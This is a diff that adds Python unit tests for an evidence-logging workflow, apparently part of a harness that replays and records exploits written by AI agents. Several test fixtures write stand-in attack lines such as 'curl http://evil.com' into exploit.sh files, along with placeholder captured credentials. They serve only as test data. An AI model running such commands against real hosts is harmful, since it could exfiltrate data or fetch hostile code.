@@ -68,6 +68,60 @@ class TestRestartRuntime:
         assert kwargs["start_ssrf"] is False
 
 
+class TestBuildEvidenceLog:
+    def test_includes_replay_stdout(self, tmp_path):
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(evidence_path, replay_stdout="EXPLOIT OUTPUT")
+        content = evidence_path.read_text()
+        assert "EXPLOIT OUTPUT" in content
+
+    def test_includes_agent_output_files(self, tmp_path):
+        agent_output = tmp_path / "agent_output"
+        agent_output.mkdir()
+        (agent_output / "result.txt").write_text("CAPTURED_SECRET")
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(evidence_path, agent_output_dir=agent_output)
+        assert "CAPTURED_SECRET" in evidence_path.read_text()
+
+    def test_includes_agent_exploit_files(self, tmp_path):
+        agent_exploit = tmp_path / "agent_exploit"
+        agent_exploit.mkdir()
+        (agent_exploit / "exploit.sh").write_text("curl http://evil")
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(evidence_path, agent_exploit_dir=agent_exploit)
+        assert "curl http://evil" in evidence_path.read_text()
+
+    def test_includes_agent_log(self, tmp_path):
+        agent_log = tmp_path / "agent.log"
+        agent_log.write_text("Found password: admin123")
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(evidence_path, agent_log=agent_log)
+        content = evidence_path.read_text()
+        assert "Found password: admin123" in content
+        assert "agent.log" in content
+
+    def test_skips_missing_sources(self, tmp_path):
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(
+            evidence_path,
+            agent_output_dir=tmp_path / "nonexistent",
+            agent_exploit_dir=tmp_path / "also_missing",
+            agent_log=tmp_path / "no_such.log",
+        )
+        assert evidence_path.read_text() == ""
+
+    def test_excludes_binary_files(self, tmp_path):
+        agent_output = tmp_path / "agent_output"
+        agent_output.mkdir()
+        (agent_output / "binary.bin").write_bytes(b"\x00\x01\x80\xff")
+        (agent_output / "text.txt").write_text("readable")
+        evidence_path = tmp_path / "evidence.log"
+        Workflow.build_evidence_log(evidence_path, agent_output_dir=agent_output)
+        content = evidence_path.read_text()
+        assert "readable" in content
+        assert "binary.bin" not in content
+
+
 class TestRunExploit:
     def test_writes_evidence_files(self, workflow, tmp_path):
         exploit_dir = tmp_path / "agent_exploit"
@@ -128,6 +182,37 @@ class TestRunExploit:
 
         evidence = Path(result["replay_evidence_path"]).read_text()
         assert "SECRET_DATA" in evidence
+
+    def test_evidence_includes_agent_log_and_exploit_source(self, workflow, tmp_path):
+        exploit_dir = tmp_path / "agent_exploit"
+        exploit_dir.mkdir()
+        (exploit_dir / "exploit.sh").write_text("echo hello")
+
+        # Simulate logs_dir with agent.log and agent_exploit/
+        logs_dir = tmp_path / "logs"
+        logs_dir.mkdir()
+        (logs_dir / "agent.log").write_text("Agent found credential: secret123")
+        agent_exploit_in_logs = logs_dir / "agent_exploit"
+        agent_exploit_in_logs.mkdir()
+        (agent_exploit_in_logs / "exploit.sh").write_text("curl http://evil.com")
+
+        output_dir = tmp_path / "replay_output"
+        exploit_runner = tmp_path / "run_exploit.sh"
+        exploit_runner.write_text('#!/bin/bash\necho "REPLAY"\nexit 0')
+
+        result = workflow._run_exploit(
+            exploit_dir=exploit_dir,
+            output_dir=output_dir,
+            exploit_runner=exploit_runner,
+            exploit_image="test:latest",
+            codebase_dir=tmp_path,
+            logs_dir=logs_dir,
+        )
+
+        evidence = Path(result["replay_evidence_path"]).read_text()
+        assert "Agent found credential: secret123" in evidence
+        assert "curl http://evil.com" in evidence
+        assert "REPLAY" in evidence
 
     def test_exit_code_preserved(self, workflow, tmp_path):
         exploit_dir = tmp_path / "agent_exploit"
